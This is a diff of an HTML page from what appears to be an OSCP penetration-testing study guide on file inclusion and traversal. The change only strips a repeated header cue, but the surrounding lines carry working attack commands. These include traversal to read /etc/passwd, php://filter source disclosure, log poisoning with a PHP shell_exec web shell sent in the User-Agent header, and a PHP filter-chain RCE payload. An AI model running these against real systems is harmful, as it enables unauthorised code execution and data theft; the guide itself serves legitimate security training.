@@ -2,7 +2,7 @@
 <p><a href="/oscp/reference/03-initial-access/">← Stage index</a> · <a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">Web mapping</a> · <a href="/oscp/cheatsheets/web-exploitation/#file-paths-and-uploads">Quick sheet</a> · <a href="/oscp/notes/Master_Notes/#file-handling-primitives">Mechanics</a> | <a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | Study methods: <a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></p>
 <blockquote>
 <p><strong>Use when:</strong> a request selects, includes, downloads, previews or uploads a file. Prove read, inclusion, write and execution separately.</p>
-</blockquote><details data-method-fold><summary><h2 id="directory-traversal-prove-file-read">9.3.2.1 Directory traversal: prove file read</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote><details data-method-fold><summary><h2 id="directory-traversal-prove-file-read">9.3.2.1 Directory traversal: prove file read</h2></summary>
 <a id="s-9-3-2-1"></a>
 <p>Linux proof:</p>
 <pre><code class="language-bash">curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH
@@ -28,13 +28,13 @@
 </details>
 <blockquote>
 <p><strong>Next:</strong> use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered <a href="/oscp/notes/ad-investigation/glossary/#term-authentication" title="Establishing an identity through a protocol. Success does not automatically permit a share read, remote logon or execution." class="glossary-term">authentication</a> material to Block 5 with its source and identity context.</p>
-</blockquote></details><details data-method-fold><summary><h2 id="php-inclusion-retrieve-source">9.3.2.2 PHP inclusion: retrieve source</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></details><details data-method-fold><summary><h2 id="php-inclusion-retrieve-source">9.3.2.2 PHP inclusion: retrieve source</h2></summary>
 <a id="s-9-3-2-2"></a>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php
 printf '%s' 'BASE64_DATA' | base64 -d
 </code></pre></div><div class="command-reading"><blockquote>
 <p><strong><span class="reference-cue cue-condition">Prerequisite:</span></strong> a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context.</p>
-</blockquote></div></div></details><details data-method-fold><summary><h2 id="lfi-to-command-execution-through-a-writablereadable-log">9.3.2.3 LFI to command execution through a writable/readable log</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div></details><details data-method-fold><summary><h2 id="lfi-to-command-execution-through-a-writablereadable-log">9.3.2.3 LFI to command execution through a writable/readable log</h2></summary>
 <a id="s-9-3-2-3"></a>
 <div class="command-pair"><div class="command-action"><pre><code class="language-bash">curl -sk -A '&#x3C;?php echo shell_exec($_GET["cmd"]); ?>' http://TARGET:PORT/
 curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php
@@ -108,7 +108,7 @@ ssh -i ./web_upload_key -p SSH_PORT USER@TARGET
 <li>write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive;</li>
 <li>product-specific handler/CVE requirement -> Block 6;</li>
 <li>no decisive result -> return to the <a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">web behavior map</a> with the exact disproven context.</li>
-</ul><details data-method-fold><summary><h2 id="php-include-control--generate-a-filter-chain-when-uploads-are-unavailable">9.3.2.8 PHP include control — generate a filter chain when uploads are unavailable</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</ul><details data-method-fold><summary><h2 id="php-include-control--generate-a-filter-chain-when-uploads-are-unavailable">9.3.2.8 PHP include control — generate a filter chain when uploads are unavailable</h2></summary>
 <a id="s-9-3-2-8"></a>
 <p>Use only after confirming a PHP <code>include</code>/<code>require</code> sink accepts a fully controlled stream URI. A file-read endpoint that returns bytes without evaluating PHP is a different primitive. The required iconv/filter behavior must be present.</p>
 <h3 id="variant-9-3-2-8-1">9.3.2.8.1 Generate the chain locally; copy the complete URI from its output</h3><pre><code class="language-bash"># Generate the chain locally; copy the complete URI from its output
@@ -117,7 +117,7 @@ python3 php_filter_chain_generator.py --chain '&#x3C;?php system("id"); ?>'</cod
 curl -sS -G --data-urlencode 'page=FILTER_URI' http://TARGET:PORT/PATH
 </code></pre>
 <p>Read: an attributable target UID proves execution; base64-looking text alone can simply be source/file disclosure. Filter errors, URI truncation or rejected wrappers → inspect the actual PHP build, filter availability and parameter limits. Use the existing upload/log inclusion routes when their prerequisites fit; do not assume a modern <code>%00</code> suffix truncates a filename.</p>
-<p>Sources: <a href="https://github.com/synacktiv/php_filter_chain_generator">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="imagepdf-upload-plus-inclusion--verify-the-consumer">9.3.2.9 Image/PDF upload plus inclusion — verify the consumer</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/synacktiv/php_filter_chain_generator">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="imagepdf-upload-plus-inclusion--verify-the-consumer">9.3.2.9 Image/PDF upload plus inclusion — verify the consumer</h2></summary>
 <a id="s-9-3-2-9"></a>
 <p>Use when an accepted upload can later be read by a confirmed PHP include sink. MIME, extension and magic-byte checks only describe acceptance; they do not establish an executable handler.</p>
 <h3 id="variant-9-3-2-9-1">9.3.2.9.1 Start with an existing valid test JPEG; place a small PHP effect in its metadata</h3><pre><code class="language-bash"># Start with an existing valid test JPEG; place a small PHP effect in its metadata
